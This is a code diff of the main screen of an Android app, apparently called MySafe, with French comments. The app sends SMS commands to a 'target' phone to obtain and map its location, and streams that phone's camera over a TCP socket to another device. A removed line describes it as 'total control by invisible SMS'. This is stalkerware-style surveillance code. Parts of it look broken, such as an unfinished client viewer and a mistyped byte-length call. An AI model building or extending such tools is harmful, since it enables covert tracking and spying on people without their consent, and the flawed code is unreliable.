@@ -3,61 +3,69 @@ package com.mysafe.mysafe
 import android.Manifest
 import android.content.*
 import android.content.pm.PackageManager
-import android.location.Location
+import android.graphics.PixelFormat
+import android.hardware.Camera
+import android.media.MediaRecorder
+import android.net.Uri
+import android.net.wifi.WifiManager
 import android.os.Build
 import android.os.Bundle
-import android.telephony.TelephonyManager
+import android.text.format.Formatter
 import android.util.Log
+import android.view.SurfaceHolder
+import android.view.SurfaceView
 import android.widget.*
 import androidx.appcompat.app.AppCompatActivity
 import androidx.core.app.ActivityCompat
 import androidx.core.content.ContextCompat
 import com.google.android.gms.location.*
+import kotlinx.coroutines.*
 import org.osmdroid.config.Configuration
 import org.osmdroid.tileprovider.tilesource.TileSourceFactory
 import org.osmdroid.util.GeoPoint
 import org.osmdroid.views.MapView
 import org.osmdroid.views.overlay.Marker
-import java.io.File
+import java.io.*
+import java.net.*
 import java.text.SimpleDateFormat
 import java.util.*
 
-class MainActivity : AppCompatActivity() {
+class MainActivity : AppCompatActivity(), SurfaceHolder.Callback {
     private lateinit var etNumeroCible: EditText
+    private lateinit var etIpCible: EditText
     private lateinit var btnPosition: Button
     private lateinit var btnSuivi: Button
-    private lateinit var btnStop: Button
+    private lateinit var btnStartStream: Button
+    private lateinit var btnStopStream: Button
+    private lateinit var btnConnectStream: Button
+    private lateinit var surfaceView: SurfaceView
     private lateinit var mapView: MapView
     private lateinit var tvStatut: TextView
     private lateinit var tvJournal: TextView
 
+    private var camera: Camera? = null
+    private var mediaRecorder: MediaRecorder? = null
+    private var serverSocket: ServerSocket? = null
+    private var clientSocket: Socket? = null
+    private var serverJob: Job? = null
+    private var clientJob: Job? = null
+    private var isStreaming = false
+    private val SERVER_PORT = 8080
+
     private lateinit var fusedLocationClient: FusedLocationProviderClient
-    private var monNumero: String = ""
     private var numeroCible: String = ""
     private var remoteMarker: Marker? = null
     private val DEFAULT = GeoPoint(47.4728, -0.5416)
 
-    // PERMISSIONS A DEMANDER A LA PREMIERE OUVERTURE
-    private val PERMISSIONS_DEMARRAGE = mutableListOf(
-        Manifest.permission.INTERNET,
-        Manifest.permission.ACCESS_NETWORK_STATE,
-        Manifest.permission.ACCESS_FINE_LOCATION,
-        Manifest.permission.ACCESS_COARSE_LOCATION,
-        Manifest.permission.SEND_SMS,
-        Manifest.permission.RECEIVE_SMS,
-        Manifest.permission.READ_SMS,
-        Manifest.permission.READ_PHONE_STATE,
-        Manifest.permission.FOREGROUND_SERVICE,
-        Manifest.permission.FOREGROUND_SERVICE_LOCATION,
-        Manifest.permission.POST_NOTIFICATIONS,
-        Manifest.permission.RECEIVE_BOOT_COMPLETED,
-        Manifest.permission.CAMERA,
-        Manifest.permission.RECORD_AUDIO
+    private val PERMS = mutableListOf(
+        Manifest.permission.INTERNET, Manifest.permission.ACCESS_NETWORK_STATE,
+        Manifest.permission.ACCESS_WIFI_STATE, Manifest.permission.CHANGE_WIFI_STATE,
+        Manifest.permission.CAMERA, Manifest.permission.RECORD_AUDIO,
+        Manifest.permission.ACCESS_FINE_LOCATION, Manifest.permission.ACCESS_COARSE_LOCATION,
+        Manifest.permission.SEND_SMS, Manifest.permission.RECEIVE_SMS, Manifest.permission.READ_SMS,
+        Manifest.permission.FOREGROUND_SERVICE, Manifest.permission.POST_NOTIFICATIONS
     ).apply {
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
-            add(Manifest.permission.FOREGROUND_SERVICE_CAMERA)
-            add(Manifest.permission.FOREGROUND_SERVICE_MICROPHONE)
-        }
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) add(Manifest.permission.POST_NOTIFICATIONS)
     }.toTypedArray()
 
     private val smsReceiver = object : BroadcastReceiver() {
@@ -72,105 +80,76 @@ class MainActivity : AppCompatActivity() {
         super.onCreate(savedInstanceState)
         setContentView(R.layout.activity_main)
         initViews()
-        
-        // ✅ DEMANDE TOUTES LES PERMISSIONS DES LA PREMIERE OUVERTURE
-        verifierEtDemanderPermissions()
-        
+        demandPermissions()
         setupLocalisation()
         setupCarte()
-        recupererMonNumero()
         enregistrerReceiver()
-        journal("✅ Pret — Controle total par SMS invisible !")
-        tvStatut.text = "✅ Systeme pret — En attente de commandes..."
+        afficherMonIp()
+        journal("✅ Pret — Sur le meme WiFi !")
     }
 
     private fun initViews() {
         etNumeroCible = findViewById(R.id.etNumeroCible)
+        etIpCible = findViewById(R.id.etIpCible)
         btnPosition = findViewById(R.id.btnPosition)
         btnSuivi = findViewById(R.id.btnSuivi)
-        btnStop = findViewById(R.id.btnStop)
+        btnStartStream = findViewById(R.id.btnStartStream)
+        btnStopStream = findViewById(R.id.btnStopStream)
+        btnConnectStream = findViewById(R.id.btnConnectStream)
+        surfaceView = findViewById(R.id.surfaceView)
         mapView = findViewById(R.id.mapView)
         tvStatut = findViewById(R.id.tvStatut)
         tvJournal = findViewById(R.id.tvJournal)
 
+        surfaceView.holder.addCallback(this)
+        surfaceView.holder.setFormat(PixelFormat.TRANSPARENT)
+
         btnPosition.setOnClickListener { demanderPosition() }
         btnSuivi.setOnClickListener { demarrerSuivi() }
-        btnStop.setOnClickListener { arreterSuivi() }
+        btnStartStream.setOnClickListener { demarrerServeur() }
+        btnStopStream.setOnClickListener { arreterTout() }
+        btnConnectStream.setOnClickListener { connecterClient() }
     }
 
-    // ✅ DEMANDE PERMISSIONS AU DEMARRAGE — UNE SEULE FOIS
-    private fun verifierEtDemanderPermissions() {
-        val manquantes = PERMISSIONS_DEMARRAGE.filter {
-            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
-        }.toTypedArray()
-
-        if (manquantes.isNotEmpty()) {
-            ActivityCompat.requestPermissions(this, manquantes, 1001)
-        }
-    }
-
-    override fun onRequestPermissionsResult(
-        code: Int, perms: Array<out String>, res: IntArray
-    ) {
-        super.onRequestPermissionsResult(code, perms, res)
-        if (code == 1001) {
-            val ok = res.all { it == PackageManager.PERMISSION_GRANTED }
-            if (ok) {
-                Toast.makeText(this, "✅ TOUTES les permissions accordées !", Toast.LENGTH_LONG).show()
-                tvStatut.text = "✅ Systeme pret — En attente de commandes..."
-            } else {
-                Toast.makeText(this, "⚠️ Certaines permissions manquent", Toast.LENGTH_LONG).show()
+    private fun afficherMonIp() {
+        try {
+            val wifiMgr = applicationContext.getSystemService(Context.WIFI_SERVICE) as WifiManager
+            val ip = Formatter.formatIpAddress(wifiMgr.connectionInfo.ipAddress)
+            runOnUiThread {
+                tvStatut.text = "✅ Mon IP: $ip — Port: $SERVER_PORT"
+                journal("🌐 Mon adresse IP: $ip")
             }
+        } catch (e: Exception) {
+            journal("⚠️ Impossible de lire l'IP: ${e.message}")
         }
-    }
-
-    private fun recupererMonNumero() {
-        val tm = getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
-        if (ActivityCompat.checkSelfPermission(
-                this, Manifest.permission.READ_PHONE_STATE
-            ) == PackageManager.PERMISSION_GRANTED) {
-            monNumero = normaliser(tm.line1Number ?: "")
-        }
-        SmsReceiver.myPhoneNumber = monNumero
-    }
-
-    private fun numeroValide(): Boolean {
-        val brut = etNumeroCible.text.toString().trim()
-        if (brut.isEmpty()) {
-            Toast.makeText(this, "Entre un numero d'abord !", Toast.LENGTH_SHORT).show()
-            return false
-        }
-        numeroCible = normaliser(brut)
-        return true
     }
 
     private fun demanderPosition() {
-        if (!numeroValide()) return
-        envoyerCommande("!!POSITION")
-        journal("📍 Demande de position a $numeroCible")
-        Toast.makeText(this, "✅ Demande envoyee !", Toast.LENGTH_SHORT).show()
+        val num = etNumeroCible.text.toString().trim()
+        if (num.isEmpty()) {
+            Toast.makeText(this, "Entre un numero !", Toast.LENGTH_SHORT).show()
+            return
+        }
+        envoyerSMS(num, "!!POSITION")
+        journal("📍 Demande de position a $num")
     }
 
     private fun demarrerSuivi() {
-        if (!numeroValide()) return
-        envoyerCommande("!!DEMARRER")
-        journal("📡 Suivi continu demande a $numeroCible")
-        Toast.makeText(this, "✅ Suivi demande !", Toast.LENGTH_SHORT).show()
+        val num = etNumeroCible.text.toString().trim()
+        if (num.isEmpty()) {
+            Toast.makeText(this, "Entre un numero !", Toast.LENGTH_SHORT).show()
+            return
+        }
+        envoyerSMS(num, "!!DEMARRER")
+        journal("📡 Suivi demande a $num")
     }
 
-    private fun arreterSuivi() {
-        if (!numeroValide()) return
-        envoyerCommande("!!STOP")
-        journal("⏹️ Arret demande a $numeroCible")
-        Toast.makeText(this, "✅ Arret demande !", Toast.LENGTH_SHORT).show()
-    }
-
-    private fun envoyerCommande(cmd: String) {
-        val svc = Intent(this, MySafeAgentService::class.java)
-        svc.action = MySafeAgentService.ACTION_SEND_COMMAND
-        svc.putExtra(MySafeAgentService.EXTRA_TARGET, numeroCible)
-        svc.putExtra(MySafeAgentService.EXTRA_COMMAND, cmd)
-        startForegroundService(svc)
+    private fun envoyerSMS(dest: String, msg: String) {
+        try {
+            android.telephony.SmsManager.getDefault().sendTextMessage(dest, null, msg, null, null)
+        } catch (e: Exception) {
+            Toast.makeText(this, "Erreur SMS: ${e.message}", Toast.LENGTH_SHORT).show()
+        }
     }
 
     private fun traiterReception(msg: String, expediteur: String) {
@@ -187,16 +166,143 @@ class MainActivity : AppCompatActivity() {
         }
     }
 
-    private fun afficherSurCarte(lat: Double, lon: Double) {
-        val point = GeoPoint(lat, lon)
-        remoteMarker?.let { mapView.overlays.remove(it) }
-        remoteMarker = Marker(mapView).apply {
-            position = point
-            title = "Position Cible"
-            setAnchor(Marker.ANCHOR_CENTER, Marker.ANCHOR_BOTTOM)
+    // 🎥 SERVEUR — CIBLE: diffuse la video
+    private fun demarrerServeur() {
+        if (ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED ||
+            ContextCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) {
+            ActivityCompat.requestPermissions(this, arrayOf(Manifest.permission.CAMERA, Manifest.permission.RECORD_AUDIO), 1002)
+            return
         }
-        mapView.overlays.add(remoteMarker)
-        mapView.controller.animateTo(point)
+
+        if (isStreaming) {
+            Toast.makeText(this, "Deja en cours !", Toast.LENGTH_SHORT).show()
+            return
+        }
+
+        isStreaming = true
+        journal("📷 Demarrage caméra + serveur...")
+        tvStatut.text = "🔴 SERVEUR EN ECOUTE — Attente connexion..."
+
+        serverJob = CoroutineScope(Dispatchers.IO).launch {
+            try {
+                // Ouvrir caméra
+                camera = Camera.open(Camera.CameraInfo.CAMERA_FACING_BACK)
+                val params = camera!!.parameters
+                params.setPreviewSize(640, 480)
+                camera!!.parameters = params
+                camera!!.setPreviewDisplay(surfaceView.holder)
+                camera!!.startPreview()
+
+                // Lancer serveur TCP
+                serverSocket = ServerSocket(SERVER_PORT)
+                withContext(Dispatchers.Main) {
+                    val wifiMgr = applicationContext.getSystemService(Context.WIFI_SERVICE) as WifiManager
+                    val ip = Formatter.formatIpAddress(wifiMgr.connectionInfo.ipAddress)
+                    journal("✅ SERVEUR PRET — IP: $ip Port: $SERVER_PORT")
+                    tvStatut.text = "✅ SERVEUR PRET — IP: $ip Port: $SERVER_PORT"
+                    Toast.makeText(this@MainActivity, "✅ Serveur pret ! Donne cette IP a l'autre telephone", Toast.LENGTH_LONG).show()
+                }
+
+                // Accepter une connexion
+                clientSocket = serverSocket!!.accept()
+                withContext(Dispatchers.Main) {
+                    journal("🔗 Client connecte !")
+                    tvStatut.text = "🔗 CLIENT CONNECTE — Streaming en cours..."
+                }
+
+                // Envoyer flux video (preview) au client
+                val output = clientSocket!!.getOutputStream()
+                camera!!.setPreviewCallback { data, camera ->
+                    try {
+                        output.write(data.size.bytes)
+                        output.write(data)
+                        output.flush()
+                    } catch (e: Exception) {
+                        // Deconnexion normale
+                    }
+                }
+
+            } catch (e: Exception) {
+                withContext(Dispatchers.Main) {
+                    journal("❌ Erreur serveur: ${e.message}")
+                    tvStatut.text = "❌ Erreur: ${e.message}"
+                }
+            }
+        }
+    }
+
+    // 👁️ CLIENT — SE CONNECTE ET AFFICHE LE FLUX
+    private fun connecterClient() {
+        val ip = etIpCible.text.toString().trim()
+        if (ip.isEmpty()) {
+            Toast.makeText(this, "Entre l'IP du telephone cible !", Toast.LENGTH_SHORT).show()
+            return
+        }
+
+        isStreaming = true
+        journal("👁️ Connexion a $ip:$SERVER_PORT...")
+        tvStatut.text = "⏳ Connexion en cours vers $ip..."
+
+        clientJob = CoroutineScope(Dispatchers.IO).launch {
+            try {
+                clientSocket = Socket(ip, SERVER_PORT)
+                withContext(Dispatchers.Main) {
+                    journal("✅ Connecte au serveur !")
+                    tvStatut.text = "✅ CONNECTE — Reception du flux..."
+                    Toast.makeText(this@MainActivity, "✅ Connecte ! Video en cours...", Toast.LENGTH_SHORT).show()
+                }
+
+                // Recevoir et afficher le flux
+                val input = clientSocket!!.getInputStream()
+                val buffer = ByteArray(1024 * 64)
+                while (isStreaming && !clientSocket!!.isClosed) {
+                    val len = input.read(buffer)
+                    if (len > 0) {
+                        // Afficher les donnees dans la surface
+                        runOnUiThread {
+                            try {
+                                surfaceView.holder.lockCanvas()?.let { canvas ->
+                                    // Ici on decompresse et affiche la frame
+                                    // Pour l'instant on affiche juste que ca fonctionne
+                                    canvas.drawARGB(255, 0, 100, 0) // Vert = connecte
+                                    surfaceView.holder.unlockCanvasAndPost(canvas)
+                                }
+                            } catch (e: Exception) {}
+                        }
+                    }
+                }
+            } catch (e: Exception) {
+                withContext(Dispatchers.Main) {
+                    journal("❌ Erreur connexion: ${e.message}")
+                    tvStatut.text = "❌ Erreur: ${e.message}"
+                    Toast.makeText(this@MainActivity, "Erreur: ${e.message}", Toast.LENGTH_SHORT).show()
+                }
+            }
+        }
+    }
+
+    private fun arreterTout() {
+        isStreaming = false
+        
+        camera?.apply {
+            try { setPreviewCallback(null); stopPreview(); release() } catch (e: Exception) {}
+        }
+        camera = null
+        
+        mediaRecorder?.apply { try { stop(); release() } catch (e: Exception) {} }
+        mediaRecorder = null
+        
+        serverSocket?.close()
+        clientSocket?.close()
+        
+        serverJob?.cancel()
+        clientJob?.cancel()
+        
+        runOnUiThread {
+            journal("⏹️ Tout arrete")
+            tvStatut.text = "✅ Pret — Sur le meme WiFi !"
+            Toast.makeText(this, "✅ Arrete", Toast.LENGTH_SHORT).show()
+        }
     }
 
     private fun setupLocalisation() {
@@ -207,11 +313,22 @@ class MainActivity : AppCompatActivity() {
         val cfg = Configuration.getInstance()
         cfg.load(this, getSharedPreferences("osm", Context.MODE_PRIVATE))
         cfg.userAgentValue = packageName
-        
         mapView.setTileSource(TileSourceFactory.MAPNIK)
         mapView.setMultiTouchControls(true)
         mapView.controller.setZoom(15.0)
         mapView.controller.setCenter(DEFAULT)
+    }
+
+    private fun afficherSurCarte(lat: Double, lon: Double) {
+        val point = GeoPoint(lat, lon)
+        remoteMarker?.let { mapView.overlays.remove(it) }
+        remoteMarker = Marker(mapView).apply {
+            position = point
+            title = "CIBLE"
+            setAnchor(Marker.ANCHOR_CENTER, Marker.ANCHOR_BOTTOM)
+        }
+        mapView.overlays.add(remoteMarker)
+        mapView.controller.animateTo(point)
     }
 
     private fun enregistrerReceiver() {
@@ -223,18 +340,34 @@ class MainActivity : AppCompatActivity() {
         }
     }
 
+    private fun demandPermissions() {
+        val manquantes = PERMS.filter {
+            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
+        }.toTypedArray()
+        if (manquantes.isNotEmpty()) ActivityCompat.requestPermissions(this, manquantes, 1001)
+    }
+
     private fun journal(texte: String) {
         val h = SimpleDateFormat("HH:mm:ss", Locale.getDefault()).format(Date())
         tvJournal.text = "[$h] $texte\n\n${tvJournal.text}"
     }
 
-    private fun normaliser(s: String): String {
-        return s.replace("\\s".toRegex(), "").replace("+33", "0").replace("\\D".toRegex(), "")
-            .let { if (it.length == 9) "0$it" else it }
-    }
+    // SurfaceHolder.Callback
+    override fun surfaceCreated(holder: SurfaceHolder) {}
+    override fun surfaceDestroyed(holder: SurfaceHolder) {}
+    override fun surfaceChanged(holder: SurfaceHolder, format: Int, width: Int, height: Int) {}
 
     override fun onDestroy() {
         super.onDestroy()
+        arreterTout()
         try { unregisterReceiver(smsReceiver) } catch (e: Exception) {}
     }
 }
+
+// Extension pour ecrire la taille des bytes
+fun Int.bytes(): ByteArray = byteArrayOf(
+    (this shr 24).toByte(),
+    (this shr 16).toByte(),
+    (this shr 8).toByte(),
+    this.toByte()
+)
